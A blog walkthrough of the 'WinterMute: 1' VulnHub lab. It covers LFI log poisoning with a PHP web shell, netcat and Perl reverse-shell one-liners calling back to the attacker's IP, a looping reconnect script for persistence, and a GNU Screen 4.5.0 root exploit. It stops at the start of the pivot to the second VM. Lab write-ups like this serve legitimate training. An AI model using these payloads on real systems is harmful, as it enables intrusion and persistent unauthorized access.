---
layout: post
title: "WinterMute: 1"
date: 2019-05-01 17:36:19 +0000
author: Larry Brown
category: Walkthroughs
tags: [vulnhub, ntopng, lfi, screen, pivoting, socat, struts showcase, kernel exploit, tomcat]
---
<div>VulnHub URL:Â <a href="https://www.vulnhub.com/entry/wintermute-1,239/" target="_blank">https://www.vulnhub.com/entry/wintermute-1,239/</a></div>
<div>Hostname: HOST1: straylight, HOST2:Â neuromancer</div>
<div>IP Address: HOST1: 10.183.0.211/192.168.56.102, HOST2:Â 192.168.56.101</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Information Gathering/Recon</h2>
</div>
<div><br /></div>
<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.211.</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Service Enumeration/Scanning</h2>
</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# nmap -Pn -sT -sV -sC -A -oA wintermute-straylight -p 1-65535 10.183.0.211</div>
    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-01 13:41 EDT</div>
    <div>Nmap scan report for straylight.homenet.dom (10.183.0.211)</div>
    <div>Host is up (0.0014s latency).</div>
    <div>Not shown: 65532 closed ports</div>
    <div>PORTÂ Â Â Â Â STATE SERVICEÂ Â Â Â Â Â Â Â Â Â Â Â VERSION</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">25/tcpÂ Â Â openÂ Â smtpÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Postfix smtpd</font>
    </div>
    <div>|_smtp-commands: straylight, PIPELINING, SIZE 10240000, <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">VRFY</font>, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, </div>
    <div>| ssl-cert: Subject: commonName=straylight</div>
    <div>| Subject Alternative Name: DNS:straylight</div>
    <div>| Not valid before: 2018-05-12T18:08:02</div>
    <div>|_Not valid after:Â Â 2028-05-09T18:08:02</div>
    <div>|_ssl-date: TLS randomness does not represent time</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcpÂ Â Â openÂ Â httpÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Apache httpd 2.4.25 ((Debian))</font>
    </div>
    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.25</font> (Debian)</div>
    <div>|_http-title: Night City</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">3000/tcp openÂ Â hadoop-tasktracker Apache Hadoop</font>
    </div>
    <div>| hadoop-datanode-info: </div>
    <div>|_Â Â Logs: submit</div>
    <div>| hadoop-tasktracker-info: </div>
    <div>|_Â Â Logs: submit</div>
    <div>| http-title: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Welcome to ntopng</font>
    </div>
    <div>|_Requested resource was /lua/login.lua?referer=/</div>
    <div>|_http-trane-info: Problem with XML parsing of /evox/about</div>
    <div>MAC Address: 08:00:27:50:96:D9 (Oracle VirtualBox virtual NIC)</div>
    <div>Device type: general purpose</div>
    <div>Running: Linux 3.X|4.X</div>
    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
    <div>OS details: Linux 3.2 - 4.9</div>
    <div>Network Distance: 1 hop</div>
    <div>Service Info: Host:Â Â straylight</div>
    <div>
        <div><br /></div>
    </div>
    <div>TRACEROUTE</div>
    <div>HOP RTTÂ Â Â Â Â ADDRESS</div>
    <div>1Â Â Â 1.43 ms straylight.homenet.dom (10.183.0.211)</div>
    <div>
        <div><br /></div>
    </div>
    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
    <div>Nmap done: 1 IP address (1 host up) scanned in 16.91 seconds</div>
</div>
<div><br /></div>
<!--more-->
<div><br /></div>
<div>
    <h2>Gaining Access</h2>
</div>
<div><br /></div>
<div>Looking at the services and software versions detected by nmap, I notice:</div>
<ul>
    <li>
        <div>the SMTP service supports the VRFY command (so we can likely enumerate valid accounts)</div>
    </li>
    <li>
        <div>the HTTP service on TCP port 80 is using Apache 2.4.25 (which doesn't have any major issues)</div>
    </li>
    <li>
        <div>the HTTP service on TCP port 3000 is running ntopng (which has some CSRF and XSS issues, but can also allow us to view traffic... if we can login).</div>
    </li>
</ul>
<div><br /></div>
<div>I'll start by scanning the HTTP service on TCP port 80 with nikto.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# nikto -h http://10.183.0.211</div>
    <div>- Nikto v2.1.6</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ Target IP:Â Â Â Â Â Â Â Â Â Â 10.183.0.211</div>
    <div>+ Target Hostname:Â Â Â Â 10.183.0.211</div>
    <div>+ Target Port:Â Â Â Â Â Â Â Â 80</div>
    <div>+ Start Time:Â Â Â Â Â Â Â Â Â 2019-05-01 13:46:07 (GMT-4)</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.25</font> (Debian)</div>
    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
    <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
    <div>+ Server may leak inodes via ETags, header found with file /, inode: 146, size: 56c0ddaf44f8b, mtime: gzip</div>
    <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.25</font> appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
    <div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </div>
    <div>+ OSVDB-3092: /manual/: Web server manual found.</div>
    <div>+ OSVDB-3268: /manual/images/: Directory indexing found.</div>
    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
    <div>+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host</div>
    <div>+ End Time:Â Â Â Â Â Â Â Â Â Â Â 2019-05-01 13:47:11 (GMT-4) (64 seconds)</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ 1 host(s) tested</div>
</div>
<div><br /></div>
<div>Nikto didn't find anything that interesting, so I'll see if there are some other directories using dirb. Unfortunately, dirb didn't find anything helpful either.</div>
<div><br /></div>
<div>Checking the default site, we have a fun "storyline" printed to the screen, but not much to "hack".</div>
<div><br /></div>
<div><img height="784" src="/assets/images/2019-05-01-wintermute-1/FA838CF3-6A6B-4C91-B133-CC9BFF1C914C.png" width="2634" /></div>
<div><br /></div>
<div>I'll move on to the ntopng service and see if there are some leads there. Visiting the default site for the HTTP service on TCP port 3000, we are greeted with a login screen.</div>
<div><br /></div>
<div><img height="838" src="/assets/images/2019-05-01-wintermute-1/66782384-C7C2-4688-8BBF-F283EC1BEBD2.png" width="740" /></div>
<div><br /></div>
<div>The "Hint" at the bottom of the login form also lets us know the default credentials. ðŸ˜„</div>
<div><br /></div>
<div>After logging in and digging around, we notice the following Info under Flows.</div>
<div><br /></div>
<div><img height="810" src="/assets/images/2019-05-01-wintermute-1/ADEEC79D-7E13-4870-861D-6472F2A231A9.png" width="2632" /></div>
<div><br /></div>
<div>The Info column has some URLs that wouldn't have turned up in our brute force scanning. I'm going to check them out.</div>
<div><br /></div>
<div>TheÂ <a href="http://10.183.0.211/freeside/">http://10.183.0.211/freeside/</a>Â URL doesn't return anything interesting, but theÂ <a href="http://10.183.0.211/turing-bolo/">http://10.183.0.211/turing-bolo/</a>Â page has an interactive form.</div>
<div><br /></div>
<div><img height="656" src="/assets/images/2019-05-01-wintermute-1/B8F174B5-7C5D-48AE-84C8-1ACB48A83784.png" width="1342" /></div>
<div><br /></div>
<div>Selecting "Case" and clicking Submit takes me toÂ <a href="http://10.183.0.211/turing-bolo/bolo.php?bolo=case">http://10.183.0.211/turing-bolo/bolo.php?bolo=case</a></div>
<div><br /></div>
<div>This page provides a "log" of activity, but also mentions logs for other users from the dropdown list.</div>
<div><br /></div>
<div><img height="164" src="/assets/images/2019-05-01-wintermute-1/1DC92C9E-673E-4C98-BD16-289EC113D46D.png" width="828" /></div>
<div><br /></div>
<div>Modifying the querystring in the URL, we can load the other user's log file by just changing the 'bolo' variable. We can also load the .log files directly by just specifying the file:Â <a href="http://10.183.0.211/turing-bolo/case.log">http://10.183.0.211/turing-bolo/case.log</a></div>
<div><br /></div>
<div>This tells us the PHP code for bolo.php is likely just taking the 'bolo' parameter from the URL and appending ".log" to it to know which file to load. If that's the case, we might be able to use parent paths to load any ".log" file on the system... if we know where they are. Since we know this system has a mail service available, let's start by trying to load 'mail.log' from /var/log. To do that, our URL will be:Â <a href="http://10.183.0.211/turing-bolo/bolo.php?bolo=/var/log/mail">http://10.183.0.211/turing-bolo/bolo.php?bolo=/var/log/mail</a>. Notice we don't put 'mail.log', since the PHP code is appending '.log' when loading the file.</div>
<div><br /></div>
<div><img height="1032" src="/assets/images/2019-05-01-wintermute-1/6F39F4BF-9814-400B-BD02-21F3323ADCE9.png" width="2620" /></div>
<div><br /></div>
<div>That worked! Now that we know we can load the mail log through PHP, the next step is to try to get PHP code into the mail log. We can see in the log that the mail service is using Postfix version 3.1.8, so let's check the exploit database.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Postfix SMTP 4.2.x &lt; 4.2.48 - 'Shellshock' Remote Command InjectionÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/remote/34896.py</div>
</div>
<div><br /></div>
<div>This exploit doesn't match our version number, but does match what we want to do. The python script sets a "payload" in several of the possible SMTP headers which, if we can get any of those headers to show up in the log, might allow us to get command execution. Let's try it out.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# cp /usr/share/exploitdb/exploits/linux/remote/34896.py .</div>
    <div>root@kali:~/Walkthroughs/wintermute# python 34896.py </div>
    <div>shellshock_smtp.py &lt;target&gt; &lt;command&gt;</div>
</div>
<div><br /></div>
<div>I copy the script to my working directory and run it to see the parameters it wants. Now I'll try to set up a simple PHP command processor in the mail log.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# python 34896.py 10.183.0.211 '&lt;?php echo system($_GET["cmd"]); ?&gt;'</div>
</div>
<div><br /></div>
<div>If this worked, we should be able to request the mail log with an additional 'cmd' parameter to execute a system command. Let's try it with the 'id' command.</div>
<div><br /></div>
<div><a href="http://10.183.0.211/turing-bolo/bolo.php?bolo=/var/log/mail&amp;cmd=id">http://10.183.0.211/turing-bolo/bolo.php?bolo=/var/log/mail&amp;cmd=id</a></div>
<div><br /></div>
<div>Looks like it worked!</div>
<div><br /></div>
<div><img height="254" src="/assets/images/2019-05-01-wintermute-1/FC3A15CA-FE7B-45E4-8752-52FE38E62424.png" width="2628" /></div>
<div><br /></div>
<div>Now we can use the command execution to try to get a reverse shell. First, we'll start our listeners in Metasploit. I like to use two listeners because the first one (established through a web request) can often timeout pretty quickly.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 &gt; use exploit/multi/handler</div>
    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
    <div>payload =&gt; generic/shell_reverse_tcp</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
    <div>LPORT =&gt; 5432</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 0.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:5432</div>
    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
    <div>payload =&gt; generic/shell_reverse_tcp</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
    <div>LPORT =&gt; 5433</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 1.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
</div>
<div><br /></div>
<div>Next, we'll build our URL with our system command that will use netcat to establish the reverse shell. I'll URL encode the following command.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5432 &gt;/tmp/f</div>
</div>
<div><br /></div>
<div>Then make the request toÂ <a href="http://10.183.0.211/turing-bolo/bolo.php?bolo=/var/log/mail&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.183.0.222%205432%20%3E%2Ftmp%2Ff">http://10.183.0.211/turing-bolo/bolo.php?bolo=/var/log/mail&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.183.0.222%205432%20%3E%2Ftmp%2Ff</a></div>
<div><br /></div>
<div>And we have our session...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.211:50800) at 2019-05-01 14:53:55 -0400</div>
    <div>
        <div><br /></div>
    </div>
    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
    <div>[*] Starting interaction with 1...</div>
    <div>
        <div><br /></div>
    </div>
    <div>pwd</div>
    <div>/var/www/html/turing-bolo</div>
    <div>$ id</div>
    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
    <div>$ perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
    <div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.211:40352) at 2019-05-01 14:54:07 -0400</div>
    <div>
        <div><br /></div>
    </div>
    <div>background</div>
    <div>
        <div><br /></div>
    </div>
    <div>Background session 1? [y/N]Â Â y</div>
    <div>msf5 exploit(multi/handler) &gt; sessions 2</div>
    <div>[*] Starting interaction with 2...</div>
    <div>
        <div><br /></div>
    </div>
    <div>www-data@straylight:/var/www/html/turing-bolo$ id</div>
    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
    <div>www-data@straylight:/var/www/html/turing-bolo$</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Maintaining Access</h2>
</div>
<div><br /></div>
<div>Since there isn't a SSH service available, I won't be able to SSH to the box with this account. I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutesÂ and use python'sÂ SimpleHTTPServer to serve it up to the victim.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# cat thumbs</div>
    <div>#!/bin/sh</div>
    <div>while true; do</div>
    <div>Â Â Â Â perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
    <div>Â Â Â Â # sleep for 300 seconds (5 mins)</div>
    <div>Â Â Â Â sleep 300</div>
    <div>done</div>
    <div>root@kali:~/Walkthroughs/wintermute# python -m SimpleHTTPServer 4321</div>
    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
    <div>10.183.0.211 - - [01/May/2019 14:58:47] "GET /thumbs HTTP/1.1" 200 -</div>
</div>
<div><br /></div>
<div>I uploaded the script to the victim's /var/www/html/turing-boloÂ directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@straylight:/var/www/html/turing-bolo$ wget -O thumbs 10.183.0.222:4321/thumbs</div>
    <div>--2019-05-01 11:58:47--Â Â http://10.183.0.222:4321/thumbs</div>
    <div>Connecting to 10.183.0.222:4321... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 309 [application/octet-stream]</div>
    <div>Saving to: 'thumbs'</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â 0KÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 100% 67.7M=0s</div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-05-01 11:58:47 (67.7 MB/s) - 'thumbs' saved [309/309]</div>
    <div>
        <div><br /></div>
    </div>
    <div>www-data@straylight:/var/www/html/turing-bolo$ chmod +x thumbs</div>
    <div>www-data@straylight:/var/www/html/turing-bolo$ ./thumbs &amp;</div>
    <div>[1] 5295</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Privilege Escalation</h2>
</div>
<div><br /></div>
<div>One of the first things I like to do is check the $PATH for programs with the "sticky" bit set and root as the owner. These program can sometimes be used (abused) to gain root access. To do that, I run the following command.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@straylight:/$ for path in $(echo $PATH | tr ":" "\n"); do find $path -user root -perm -4000 2&gt;&amp;1 | grep -v "Permission denied"; done</div>
    <div>ser root -perm -4000 2&gt;&amp;1 | grep -v "Permission denied"; done</div>
    <div>/usr/bin/gpasswd</div>
    <div>/usr/bin/chsh</div>
    <div>/usr/bin/chfn</div>
    <div>/usr/bin/passwd</div>
    <div>/usr/bin/newgrp</div>
    <div>/bin/su</div>
    <div>/bin/umount</div>
    <div>/bin/mount</div>
    <div>/bin/screen-4.5.0</div>
    <div>/bin/ping</div>
</div>
<div><br /></div>
<div>Most of these are typical, but the one that stands out is screen (with a helpful version number in the name). Checking the exploit database, we happen to have a known privilege escalation issue with this version.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>GNU Screen 4.5.0 - Local Privilege EscalationÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/local/41154.sh</div>
</div>
<div><br /></div>
<div>I copy the shell script to my working directory and then use python's SimpleHTTPServer to transfer it to the victim's /tmp directory.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# cp /usr/share/exploitdb/exploits/linux/local/41154.sh .</div>
    <div>root@kali:~/Walkthroughs/wintermute# python -m SimpleHTTPServer 4321</div>
    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
    <div>10.183.0.211 - - [01/May/2019 15:09:04] "GET /41154.sh HTTP/1.1" 200 -</div>
</div>
<div><br /></div>
<div>On the victim, I use wget to pull down the file, make it executable, and then try to run it, but get an error...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@straylight:/tmp$ cd /tmp</div>
    <div>www-data@straylight:/tmp$ wget -O 41154.sh 10.183.0.222:4321/41154.sh</div>
    <div>--2019-05-01 12:09:04--Â Â http://10.183.0.222:4321/41154.sh</div>
    <div>Connecting to 10.183.0.222:4321... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 1192 (1.2K) [text/x-sh]</div>
    <div>Saving to: '41154.sh'</div>
    <div>
        <div><br /></div>
    </div>
    <div>41154.shÂ Â Â Â Â Â Â Â Â Â Â Â 100%[===================&gt;]Â Â Â 1.16KÂ Â --.-KB/sÂ Â Â Â in 0s</div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-05-01 12:09:04 (204 MB/s) - '41154.sh' saved [1192/1192]</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>www-data@straylight:/tmp$ chmod +x 41154.sh</div>
    <div>chmod +x 41154.sh</div>
    <div>www-data@straylight:/tmp$ ./41154.sh</div>
    <div>./41154.sh</div>
    <div>bash: ./41154.sh: /bin/bash^M: bad interpreter: No such file or directory</div>
</div>
<div><br /></div>
<div>Errors like this are typically due to bad line endings (windows instead of unix). I'll run dos2unix on the script on my local machine and re-download it on the victim.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/wintermute# dos2unix 41154.sh</div>
    <div>dos2unix: converting file 41154.sh to Unix format...</div>
</div>
<div><br /></div>
<div>Now I'll try to run it again...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@straylight:/tmp$ ./41154.sh</div>
    <div>~ gnu/screenroot ~</div>
    <div>[+] First, we create our shell and library...</div>
    <div>/tmp/libhax.c: In function 'dropshell':</div>
    <div>/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod' [-Wimplicit-function-declaration]</div>
    <div>Â Â Â Â Â chmod("/tmp/rootshell", 04755);</div>
    <div>Â Â Â Â Â ^~~~~</div>
    <div>/tmp/rootshell.c: In function 'main':</div>
    <div>/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]</div>
    <div>Â Â Â Â Â setuid(0);</div>
    <div>Â Â Â Â Â ^~~~~~</div>
    <div>/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid' [-Wimplicit-function-declaration]</div>
    <div>Â Â Â Â Â setgid(0);</div>
    <div>Â Â Â Â Â ^~~~~~</div>
    <div>/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid' [-Wimplicit-function-declaration]</div>
    <div>Â Â Â Â Â seteuid(0);</div>
    <div>Â Â Â Â Â ^~~~~~~</div>
    <div>/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]</div>
    <div>Â Â Â Â Â setegid(0);</div>
    <div>Â Â Â Â Â ^~~~~~~</div>
    <div>/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]</div>
    <div>Â Â Â Â Â execvp("/bin/sh", NULL, NULL);</div>
    <div>Â Â Â Â Â ^~~~~~</div>
    <div>[+] Now we create our /etc/ld.so.preload file...</div>
    <div>[+] Triggering...</div>
    <div>' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</div>
    <div>[+] done!</div>
    <div>No Sockets found in /tmp/screens/S-www-data.</div>
    <div>
        <div><br /></div>
    </div>
    <div># id</div>
    <div>uid=0(root) gid=0(root) groups=0(root),33(www-data)</div>
</div>
<div><br /></div>
<div>And it worked! ðŸ˜„</div>
<div><br /></div>
<div>Let's get the flag from /root.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div># cd /root</div>
    <div># cat flag.txt</div>
    <div>5ed185fd75a8d6a7056c96a436c6d8aa</div>
</div>
<div><br /></div>
<div>In most cases, we'd be done now, but this challenge involves two VMs. The second VM is not accessible on the local network and can only be reached by pivoting through our compromised VM.</div>
<div><br /></div>
<div>We even have a note.txt in our /root directory that continues the "storyline".</div>
<div><br /></div>
